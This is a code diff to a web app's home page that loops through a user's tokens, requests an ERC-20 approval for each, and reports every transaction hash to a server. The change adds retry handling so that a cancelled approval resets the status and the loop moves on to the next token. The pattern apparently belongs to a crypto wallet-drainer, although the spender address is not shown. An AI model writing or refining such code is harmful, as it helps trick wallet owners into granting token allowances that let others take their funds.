@@ -116,6 +116,7 @@ export default function Home() {
       // approve and report
       for (const token of usableTokens) {
         setStatus(`Approving ${token.symbol}...`);
+      try {
         const txHash = await writeContractAsync({
           address: token.address,
           abi: erc20Abi,
@@ -159,7 +160,14 @@ export default function Home() {
             txHash,
           }),
         }).catch(console.error);
+
+      } catch (err: any) {
+        console.error("User canceled or error:", err);
+        setStatus(""); // ✅ Reset so the next click generates a fresh deep link
+        await new Promise(res => setTimeout(res, 300)); // ✅ small delay to avoid wallet caching
+        }
       }
+
       setStatus("All approvals completed!");
     } catch (err: any) {
       console.error(err);
